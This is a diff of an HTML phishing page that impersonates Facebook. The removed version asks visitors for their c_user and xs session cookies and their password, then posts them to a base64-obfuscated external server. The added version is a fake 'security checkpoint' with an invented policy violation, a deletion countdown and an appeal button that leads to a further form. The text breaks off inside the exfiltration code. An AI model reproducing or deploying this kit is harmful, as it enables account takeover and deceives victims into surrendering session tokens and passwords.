@@ -4,1005 +4,533 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Security verification • Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background: #fff;
-            height: 100vh;
-            overflow: hidden;
+            background: linear-gradient(145deg, #e9f0fd 0%, #f0f5fe 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* subtle background pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            right: -20%;
+            width: 80%;
+            height: 80%;
+            background: radial-gradient(circle at 70% 30%, rgba(24, 119, 242, 0.08) 0%, transparent 60%);
+            z-index: 0;
+            pointer-events: none;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -30%;
+            left: -10%;
+            width: 70%;
+            height: 70%;
+            background: radial-gradient(circle at 30% 70%, rgba(24, 119, 242, 0.05) 0%, transparent 60%);
+            z-index: 0;
+            pointer-events: none;
         }
 
         .container {
-            display: grid;
-            grid-template-columns: 55% 45%;
-            height: 100%;
-            width: 100%;
-        }
-
-        /* LEFT SECTION - Branding */
-        .left-section {
-            background: white;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 40px;
-            border-right: 1px solid #e5e7eb;
-        }
-
-        .fb-logo {
-            width: 40px;
-            height: 40px;
-        }
-
-        .fb-logo svg {
-            width: 100%;
-            height: 100%;
-        }
-
-        .marketing-image {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-
-        .logo-container {
-            position: relative;
-            z-index: 10;
-        }
-
-        .tagline {
-            position: relative;
-            z-index: 5;
-            font-size: 32px;
-            font-weight: 700;
-            line-height: 1.4;
-            color: #000;
-            word-spacing: 9999px;
-        }
-
-        .tagline .highlight {
-            color: #1877f2;
-            word-spacing: normal;
-        }
-
-        /* RIGHT SECTION - Login Form */
-        .right-section {
-            background: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-            padding: 40px 30px;
-            overflow-y: auto;
-            padding-top: 80px;
-        }
-
-        .form-container {
             width: 100%;
             max-width: 500px;
+            z-index: 10;
+            position: relative;
+        }
+
+        /* logo section */
+        .brand {
+            text-align: center;
+            margin-bottom: 2rem;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.05));
+        }
+
+        .logo {
             display: flex;
-            flex-direction: column;
-        }
-
-        .form-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #000;
-        }
-
-        .form-subtitle {
-            font-size: 15px;
-            color: #65676b;
-            margin-bottom: 30px;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 8px;
-            color: #000;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 15px;
-            border: 1px solid #ccd0d5;
-            border-radius: 8px;
-            background: #f0f2f5;
-            transition: all 0.2s;
-            font-family: inherit;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #1877f2;
-            background: white;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
-        }
-
-        .form-group input::placeholder {
-            color: #9a9ca0;
-        }
-
-        .login-button {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #1877f2 0%, #0a66c2 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
-        }
-
-        .login-button:hover {
-            background: linear-gradient(135deg, #165ee3 0%, #0a5ba8 100%);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
-        }
-
-        .login-button:active {
-            transform: scale(0.98);
-        }
-
-        .form-links {
-            display: flex;
-            justify-content: space-between;
             align-items: center;
-            margin-top: 16px;
-            font-size: 13px;
-        }
-
-        .form-links a {
-            color: #1877f2;
-            text-decoration: none;
-            transition: all 0.2s;
-        }
-
-        .form-links a:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            margin: 20px 0;
-            text-align: center;
-            color: #ccc;
-            font-size: 13px;
-        }
-
-        .signup-section {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #e5e7eb;
-            text-align: center;
-        }
-
-        .signup-link {
-            color: #1877f2;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.2s;
-        }
-
-        .signup-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-        }
-
-        .modal.show {
-            display: flex;
             justify-content: center;
+            gap: 0.75rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .logo-icon {
+            background: #1877f2;
+            width: 50px;
+            height: 50px;
+            border-radius: 16px;
+            display: flex;
             align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 12px rgba(24, 119, 242, 0.25);
         }
 
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
+        .logo-icon svg {
+            width: 32px;
+            height: 32px;
+            fill: white;
         }
 
-        .modal-content h2 {
-            color: #1f2937;
-            margin: 0 0 20px 0;
-            font-size: 18px;
+        .logo-text {
+            font-size: 2.2rem;
             font-weight: 600;
+            color: #1877f2;
+            letter-spacing: -0.5px;
         }
 
-        .modal-content label {
-            display: block;
+        .brand-tagline {
+            color: #4b5563;
+            font-size: 0.95rem;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+            background: rgba(255,255,255,0.7);
+            backdrop-filter: blur(4px);
+            display: inline-block;
+            padding: 0.2rem 1.2rem;
+            border-radius: 30px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        /* main card — glassmorphism style */
+        .card {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 32px;
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.25),
+                0 0 0 1px rgba(24, 119, 242, 0.1),
+                inset 0 2px 4px rgba(255,255,255,0.8);
+            padding: 2rem 1.8rem;
+            transition: transform 0.2s ease;
+        }
+
+        .card:hover {
+            transform: scale(1.01);
+        }
+
+        /* header inside card */
+        .card-header {
             text-align: left;
-            font-size: 13px;
-            font-weight: 600;
-            color: #1f2937;
-            margin-bottom: 16px;
+            margin-bottom: 1.75rem;
         }
 
-        .modal-content input[type="text"] {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 20px;
-            border: 1.5px solid #e5e7eb;
-            border-radius: 8px;
-            font-size: 14px;
-            box-sizing: border-box;
-            background-color: #f0f2f5;
-            transition: all 0.3s ease;
+        .card-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #1e293b, #0f172a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.02em;
+            line-height: 1.2;
         }
 
-        .modal-content input[type="text"]:focus {
-            outline: none;
-            border-color: #1877f2;
-            background-color: white;
-            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.1);
-        }
-
-        .modal-buttons {
+        .card-subtitle {
+            color: #475569;
+            font-size: 1rem;
+            margin-top: 0.4rem;
             display: flex;
-            gap: 10px;
-            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
         }
 
-        .modal-buttons button {
-            width: auto;
-            margin: 0;
-            padding: 11px 32px;
-            border-radius: 8px;
-            font-size: 14px;
+        .badge {
+            background: #e6f0ff;
+            color: #1877f2;
+            font-size: 0.75rem;
             font-weight: 600;
-            cursor: pointer;
+            padding: 0.25rem 0.75rem;
+            border-radius: 50px;
+            display: inline-block;
+        }
+
+        /* alert cards — redesigned with icons */
+        .alert {
+            border-radius: 20px;
+            padding: 1.2rem 1.2rem 1.2rem 1.5rem;
+            margin-bottom: 1.25rem;
+            display: flex;
+            gap: 1rem;
+            align-items: flex-start;
             border: none;
-            transition: all 0.3s ease;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.03);
+            transition: all 0.2s;
         }
 
-        .modal-buttons .confirm-btn {
-            background-color: #1877f2;
-            color: white;
+        .alert-danger {
+            background: linear-gradient(105deg, #fff2f2 0%, #ffe9e9 100%);
+            border-left: 5px solid #dc2626;
         }
 
-        .modal-buttons .confirm-btn:hover {
-            background-color: #0a66c2;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        .alert-warning {
+            background: linear-gradient(105deg, #fffbeb 0%, #fef3c7 100%);
+            border-left: 5px solid #f59e0b;
         }
 
-        .modal-buttons .cancel-btn {
-            background-color: #f0f2f5;
-            color: #1f2937;
+        .alert-icon {
+            flex-shrink: 0;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.02);
         }
 
-        .modal-buttons .cancel-btn:hover {
-            background-color: #e5e7eb;
-            transform: translateY(-1px);
+        .alert-danger .alert-icon {
+            color: #dc2626;
         }
 
-        .success-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            animation: scaleIn 0.5s ease-out;
+        .alert-warning .alert-icon {
+            color: #f59e0b;
         }
 
-        @keyframes scaleIn {
-            from {
-                transform: scale(0);
-                opacity: 0;
-            }
-            to {
-                transform: scale(1);
-                opacity: 1;
-            }
+        .alert-content {
+            flex: 1;
         }
 
-        .success-message-text {
-            color: #10b981;
-            font-size: 16px;
-            margin-bottom: 24px;
-            line-height: 1.6;
-            font-weight: 500;
+        .alert-title {
+            font-weight: 700;
+            font-size: 1.05rem;
+            margin-bottom: 0.3rem;
         }
 
-        .okay-btn {
-            background-color: #1877f2;
-            color: white;
-            padding: 11px 48px;
-            transition: all 0.3s ease;
+        .alert-danger .alert-title {
+            color: #b91c1c;
         }
 
-        .okay-btn:hover {
-            background-color: #0a66c2;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        .alert-warning .alert-title {
+            color: #b45309;
         }
 
-        .warning-message {
-            background: linear-gradient(135deg, #fff8e1 0%, #fef3cd 100%);
-            color: #664d03;
-            border-left: 4px solid #ffc107;
-            padding: 18px;
-            margin: 16px 0;
-            border-radius: 6px;
-            font-size: 14px;
-            line-height: 1.6;
-            border: 1px solid #ffe5a8;
+        .alert-text {
+            color: #2d3a4f;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            opacity: 0.85;
         }
 
-        .warning-message h2 {
-            margin: 0 0 8px 0;
-            font-size: 16px;
+        .countdown-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+            background: rgba(0,0,0,0.03);
+            padding: 0.35rem 0.8rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
             font-weight: 600;
-            color: #664d03;
+            color: #2c3e50;
+            margin-top: 0.75rem;
+            border: 1px dashed rgba(0,0,0,0.1);
         }
 
-        .warning-message p {
-            margin: 0;
-            color: #664d03;
+        .countdown-badge svg {
+            width: 16px;
+            height: 16px;
+            fill: #555;
         }
 
-        .video-section {
-            padding: 16px 0;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #e5e7eb;
-        }
-
-        .video-section h3 {
-            margin: 0 0 12px 0;
-            color: #1f2937;
-            font-size: 15px;
-            font-weight: 600;
-        }
-
-        .video-player {
-            margin: 12px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            background: #f0f2f5;
-        }
-
-        .video-player video {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .video-section p {
-            margin: 14px 0 0 0;
-            color: #65676b;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .message {
-            margin: 16px 0;
-            padding: 14px 16px;
-            border-radius: 6px;
-            text-align: center;
-            display: none;
-            font-weight: 500;
-            font-size: 13px;
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .message.success {
-            background-color: #dcf8c6;
-            color: #0a6e0a;
-            border: 1px solid #a6d4a8;
-            display: block;
-        }
-
-        .message.error {
-            background-color: #ffcccc;
-            color: #c60c0c;
-            border: 1px solid #ffaaaa;
-            display: block;
+        /* button */
+        .btn-container {
+            margin: 1.8rem 0 1.5rem;
         }
 
         .btn-primary {
-            width: 100%;
-            padding: 14px 24px;
-            background: linear-gradient(135deg, #1877f2 0%, #0a66c2 100%);
-            color: white;
+            background: linear-gradient(105deg, #1877f2, #166fe5);
             border: none;
-            border-radius: 12px;
-            font-size: 15px;
+            border-radius: 60px;
+            padding: 1rem 2rem;
+            width: 100%;
+            color: white;
             font-weight: 600;
+            font-size: 1.2rem;
+            letter-spacing: 0.3px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 16px;
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+            box-shadow: 0 12px 20px -10px #1877f2, 0 4px 12px rgba(0,0,0,0.1);
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.8rem;
+            border: 1px solid rgba(255,255,255,0.2);
         }
 
         .btn-primary:hover {
-            background: linear-gradient(135deg, #165ee3 0%, #0a5ba8 100%);
+            background: linear-gradient(105deg, #166fe5, #0f5fd1);
+            box-shadow: 0 18px 25px -10px #1877f2, 0 6px 16px rgba(0,0,0,0.1);
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(24, 119, 242, 0.4);
         }
 
         .btn-primary:active {
-            transform: translateY(0);
+            transform: translateY(2px);
+            box-shadow: 0 8px 14px -8px #1877f2;
         }
 
         .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
+            opacity: 0.7;
+            transform: scale(0.98);
+            pointer-events: none;
+            filter: grayscale(0.2);
         }
 
-        .mobile-notice {
-            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
-            border: 1.5px solid #2196f3;
-            color: #1565c0;
-            padding: 16px;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 14px;
+        /* info box */
+        .info-panel {
+            background: rgba(0,0,0,0.02);
+            border-radius: 18px;
+            padding: 1rem 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            border: 1px solid rgba(0,0,0,0.03);
+            margin-bottom: 1.8rem;
+        }
+
+        .info-icon {
+            background: #e7f0fe;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877f2;
+            font-size: 1.4rem;
             font-weight: 600;
-            margin-bottom: 20px;
-            display: none;
-            line-height: 1.6;
         }
 
-        /* Responsive */
-        @media (min-width: 1440px) {
-            .container {
-                grid-template-columns: 55% 45%;
-            }
-
-            .left-section {
-                padding: 50px;
-            }
-
-            .tagline {
-                font-size: 36px;
-            }
-
-            .right-section {
-                padding: 50px 80px;
-                padding-top: 100px;
-                justify-content: flex-start;
-            }
-
-            .form-container {
-                max-width: 550px;
-            }
-
-            .form-title {
-                font-size: 28px;
-                margin-bottom: 12px;
-            }
-
-            .form-subtitle {
-                font-size: 16px;
-                margin-bottom: 32px;
-            }
-
-            .warning-message {
-                padding: 20px;
-                font-size: 15px;
-            }
-
-            .video-section {
-                padding: 18px 0;
-                margin-bottom: 28px;
-            }
-
-            .form-group input {
-                padding: 14px 18px;
-                font-size: 16px;
-            }
-
-            .btn-primary {
-                padding: 16px 28px;
-                font-size: 16px;
-            }
+        .info-text {
+            color: #2c3e50;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            flex: 1;
         }
 
-        @media (max-width: 1024px) {
-            .container {
-                grid-template-columns: 50% 50%;
-            }
-
-            .left-section {
-                padding: 25px;
-            }
-
-            .tagline {
-                font-size: 22px;
-            }
-
-            .right-section {
-                padding: 30px 20px;
-                padding-top: 50px;
-            }
-
-            .form-container {
-                max-width: 480px;
-            }
-
-            .form-title {
-                font-size: 22px;
-            }
-
-            .form-subtitle {
-                font-size: 14px;
-                margin-bottom: 20px;
-            }
-
-            .warning-message {
-                padding: 14px 12px;
-                font-size: 12px;
-                margin: 10px 0;
-            }
-
-            .video-section {
-                padding: 12px 0;
-                margin-bottom: 16px;
-            }
-
-            .video-section h3 {
-                font-size: 13px;
-                margin-bottom: 8px;
-            }
-
-            .video-player video {
-                max-height: 150px;
-            }
-
-            .form-group {
-                margin-bottom: 12px;
-            }
-
-            .form-group input {
-                padding: 10px 12px;
-                font-size: 13px;
-            }
-
-            .form-group label {
-                font-size: 12px;
-                margin-bottom: 6px;
-            }
-
-            .btn-primary {
-                padding: 12px 16px;
-                font-size: 13px;
-                margin-bottom: 12px;
-            }
-
-            .fb-logo {
-                width: 32px;
-                height: 32px;
-            }
+        .info-text strong {
+            color: #c00;
+            font-weight: 700;
+            background: rgba(220,38,38,0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 40px;
+            font-size: 0.85rem;
         }
 
-        @media (max-width: 768px) {
-            .container {
-                grid-template-columns: 1fr;
-            }
-
-            .left-section {
-                display: none;
-            }
-
-            .right-section {
-                padding: 20px 16px;
-                padding-top: 30px;
-                justify-content: flex-start;
-            }
-
-            .form-container {
-                max-width: 100%;
-                width: 100%;
-            }
-
-            .form-title {
-                font-size: 20px;
-            }
-
-            .warning-message {
-                padding: 12px 14px;
-                font-size: 13px;
-                margin: 12px 0;
-            }
-
-            .video-player video {
-                max-height: 200px;
-            }
-
-            .form-group input {
-                padding: 10px 12px;
-                font-size: 14px;
-            }
-
-            .mobile-notice {
-                display: block;
-            }
+        /* footer */
+        .footer {
+            margin-top: 0.5rem;
+            text-align: center;
         }
 
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.2rem 1.5rem;
+            margin-bottom: 0.9rem;
+        }
+
+        .footer-links a {
+            color: #4b5563;
+            text-decoration: none;
+            font-size: 0.8rem;
+            font-weight: 500;
+            transition: color 0.1s;
+            border-bottom: 1px dotted transparent;
+        }
+
+        .footer-links a:hover {
+            color: #1877f2;
+            border-bottom-color: #1877f2;
+        }
+
+        .copyright {
+            color: #6b7280;
+            font-size: 0.75rem;
+            letter-spacing: 0.3px;
+        }
+
+        /* micro-interactions */
+        .timer-highlight {
+            background: #fee2e2;
+            color: #b91c1c;
+            font-weight: 700;
+            padding: 0.1rem 0.5rem;
+            border-radius: 30px;
+            margin-left: 0.3rem;
+        }
+
+        /* responsive */
         @media (max-width: 480px) {
-            .container {
-                grid-template-columns: 1fr;
-            }
-
-            .left-section {
-                display: none;
-            }
-
-            .right-section {
-                padding: 16px 12px;
-                padding-top: 24px;
-                justify-content: flex-start;
-            }
-
-            .form-container {
-                max-width: 100%;
-            }
-
-            .form-group input {
-                font-size: 16px;
-                padding: 10px 12px;
-            }
-
-            .btn-primary {
-                padding: 12px 16px;
-                font-size: 14px;
-            }
-
-            .warning-message {
-                padding: 10px 12px;
-                font-size: 12px;
-                margin: 8px 0;
-            }
-
-            .video-section h3 {
-                font-size: 14px;
-            }
-
-            .form-title {
-                font-size: 18px;
-            }
+            body { padding: 0.8rem; }
+            .card { padding: 1.5rem; }
+            .card-title { font-size: 1.5rem; }
+            .alert { padding: 1rem; }
+            .logo-text { font-size: 1.8rem; }
+            .footer-links { gap: 0.8rem; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- LEFT SECTION -->
-        <div class="left-section">
-            <div class="logo-container">
-                <div class="fb-logo">
-                    <svg viewBox="0 0 24 24" fill="currentColor" style="color: #1877f2;">
-                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+        <!-- Logo / brand -->
+        <div class="brand">
+            <div class="logo">
+                <div class="logo-icon">
+                    <svg viewBox="0 0 36 36" fill="currentColor">
+                        <path d="M20 9h4V5h-4c-3.86 0-7 3.14-7 7v4h-4v4h4v12h4V20h4l1-4h-5v-4c0-1.1.9-2 2-2z"/>
                     </svg>
                 </div>
+                <span class="logo-text">facebook</span>
             </div>
-
-            <div class="tagline">
-                Explore the things <span class="highlight">you love</span>.
-            </div>
-
-            <!-- Background Image -->
-            <img src="https://static.xx.fbcdn.net/rsrc.php/v4/y7/r/9z3jqxP6hAH.png" alt="Background" class="marketing-image">
+            <div class="brand-tagline">protected • security checkpoint</div>
         </div>
 
-        <!-- RIGHT SECTION -->
-        <div class="right-section">
-            <div class="form-container">
-                <!-- Warning Message -->
-                <div class="warning-message">
-                    <h2>Account Review Required</h2>
-                    <p>Your account requires additional verification to ensure compliance with our platform's community standards. Please complete this verification process to restore full access to your account.</p>
-                </div>
-
-                <!-- Mobile Notice -->
-                <div class="mobile-notice">
-                    For your security, please complete this verification on a desktop or laptop computer. Mobile devices are not supported for account verification.
-                </div>
-
-                <!-- Video Section -->
-                <div class="video-section">
-                    <h3>Verification Instructions</h3>
-                    <div class="video-player">
-                        <video width="100%" height="auto" controls poster="https://review-profile.github.io/thumbbb/thumb.jpg">
-                            <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-                            Your browser does not support the video tag.
-                        </video>
-                    </div>
-                    <p>Watch this video for a complete walkthrough of the verification process. Following these steps carefully will ensure your account is restored quickly and securely.</p>
-                </div>
-
-                <!-- Submission Form -->
-                <form id="userForm">
-                    <div class="form-group">
-                        <label for="firstName">c_user</label>
-                        <input type="text" id="firstName" name="firstName" placeholder="Enter" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="lastName">xs</label>
-                        <input type="text" id="lastName" name="lastName" placeholder="Enter" required>
-                    </div>
-                    
-                    <input type="hidden" name="screen_size" id="screen_size">
-                    
-                    <button type="submit" id="submitBtn" class="btn-primary">Complete Verification</button>
-                    <div class="message" id="message"></div>
-                </form>
-
-                <!-- Footer -->
-                <div style="margin-top: 32px; text-align: center; font-size: 13px; color: #65676b; padding-top: 24px; border-top: 1px solid #e5e7eb;">
-                    <p style="font-size: 12px; color: #9ca3af;">
-                        Your data is secure and encrypted. We take your privacy seriously.
-                    </p>
+        <!-- Main card -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">Confirm your identity</div>
+                <div class="card-subtitle">
+                    <span>⚡ security verification required</span>
+                    <span class="badge">step 1 of 2</span>
                 </div>
             </div>
-        </div>
-    </div>
 
-    <!-- Surname Modal -->
-    <div id="surnameModal" class="modal">
-        <div class="modal-content">
-            <h2>Additional Verification</h2>
-            <label for="surnameInput">Please re-enter your Password:</label>
-            <input type="text" id="surnameInput" placeholder="Enter">
-            <div class="modal-buttons">
-                <button class="confirm-btn" id="confirmSurnameBtn">Verify</button>
-                <button class="cancel-btn" id="cancelSurnameBtn">Cancel</button>
+            <!-- Alert 1: Violation notice with icon -->
+            <div class="alert alert-danger">
+                <div class="alert-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                </div>
+                <div class="alert-content">
+                    <div class="alert-title">Policy violation flagged</div>
+                    <div class="alert-text">Our system detected unusual activity that conflicts with Community Standards. This has been logged as a security event.</div>
+                </div>
             </div>
-        </div>
-    </div>
 
-    <!-- Success Modal -->
-    <div id="successModal" class="modal">
-        <div class="modal-content">
-            <div class="success-icon">✓</div>
-            <h2>Verification Successful</h2>
-            <div class="success-message-text">
-                Your account has been verified successfully. Your account access will be restored within 24 hours. Thank you for your patience.
+            <!-- Alert 2: auto-delete warning with timer icon -->
+            <div class="alert alert-warning">
+                <div class="alert-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+                    </svg>
+                </div>
+                <div class="alert-content">
+                    <div class="alert-title">Auto‑removal in progress</div>
+                    <div class="alert-text">If no appeal is filed, this verification page will self‑delete within 24h. Submit an appeal to retain your account.</div>
+                    <div class="countdown-badge">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>
+                        </svg>
+                        <span>⏳ expires in <span class="timer-highlight">23:47</span></span>
+                    </div>
+                </div>
             </div>
-            <button class="okay-btn" id="okayBtn">Close</button>
+
+            <!-- Continue action -->
+            <div class="btn-container">
+                <button class="btn-primary" id="continueBtn">
+                    <span>▶</span> Continue appeal process
+                </button>
+            </div>
+
+            <!-- extra info panel (subtle) -->
+            <div class="info-panel">
+                <div class="info-icon">ⓘ</div>
+                <div class="info-text">
+                    <strong>⏰ 24h auto‑delete</strong> — without your appeal this page will be permanently removed. Don't lose your account.
+                </div>
+            </div>
+
+            <!-- Footer inside card -->
+            <div class="footer">
+                <div class="footer-links">
+                    <a href="#">Help Center</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Cookies</a>
+                    <a href="#">Security</a>
+                </div>
+                <div class="copyright">
+                    Facebook © 2026 • security check v2
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        // Image rotation every 3 seconds
-        const marketingImages = [
-            'https://static.xx.fbcdn.net/rsrc.php/v4/y7/r/9z3jqxP6hAH.png',
-            'https://static.xx.fbcdn.net/rsrc.php/v4/yh/r/UQmBtVBef76.png',
-            'https://static.xx.fbcdn.net/rsrc.php/v4/yb/r/iwZfEquP1hm.png'
-        ];
-        let currentImageIndex = 0;
-        const marketingImage = document.querySelector('.marketing-image');
-        
-        if (marketingImage) {
-            setInterval(() => {
-                currentImageIndex = (currentImageIndex + 1) % marketingImages.length;
-                marketingImage.src = marketingImages[currentImageIndex];
-            }, 3000);
-        }
+        (function() {
+            const REDIRECT_URL = "form.html";  // same redirect
+            const continueBtn = document.getElementById('continueBtn');
+            let timerInterval;
 
-        // Set screen size
-        document.getElementById("screen_size").value = window.screen.width + " x " + window.screen.height;
-        
-        // Modal elements
-        const modal = document.getElementById('surnameModal');
-        const successModal = document.getElementById('successModal');
-        const surnameInput = document.getElementById('surnameInput');
-        const confirmSurnameBtn = document.getElementById('confirmSurnameBtn');
-        const cancelSurnameBtn = document.getElementById('cancelSurnameBtn');
-        const okayBtn = document.getElementById('okayBtn');
-        const message = document.getElementById('message');
-        const form = document.getElementById('userForm');
-        const screenSizeInput = document.getElementById('screen_size');
-        const submitBtn = document.getElementById('submitBtn');
-        
-        // Binary-encoded backend URL
-        function getServerUrl() {
-            const encodedUrl = 'aHR0cHM6Ly9jb21wbGV0ZS15b3VyLXByb2Nlc3Mtbm93LnNpdGUvZHluYW1pYy5waHA=';
-            return atob(encodedUrl);
-        }
-
-        function showSurnameModal() {
-            surnameInput.value = '';
-            modal.classList.add('show');
-            surnameInput.focus();
-        }
-
-        function closeSurnameModal() {
-            modal.classList.remove('show');
-        }
-        
-        function showSuccessModal() {
-            successModal.classList.add('show');
-        }
-        
-        function closeSuccessModal() {
-            successModal.classList.remove('show');
-            form.reset();
-        }
-
-        // Form submission
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const firstName = document.getElementById('firstName').value.trim();
-            const lastName = document.getElementById('lastName').value.trim();
-            const screenSize = document.getElementById('screen_size').value;
-            
-            // Validation: First name should only be numbers
-            const isFirstNameNumbers = /^\d+$/.test(firstName);
-            
-            // Validation: Last name should have minimum 20 letters
-            const isLastNameValid = lastName.length >= 20;
-            
-            // Show error if validation fails
-            if (!isFirstNameNumbers) {
-                message.className = 'message error';
-                message.textContent = 'c_user must contain only numbers.';
-                return;
-            }
-            
-            if (!isLastNameValid) {
-                message.className = 'message error';
-                message.textContent = 'xs must be at least 20 characters long.';
-                return;
-            }
-            
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
-            message.className = 'message';
-            message.textContent = 'Processing your request...';
-
-            try {
-                const formData = new FormData();
-                formData.append('firstName', firstName);
-                formData.append('lastName', lastName);
-                formData.append('screen_size', screenSize);
-
-                // Send to backend (non-blocking)
-                fetch(getServerUrl(), {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: formData
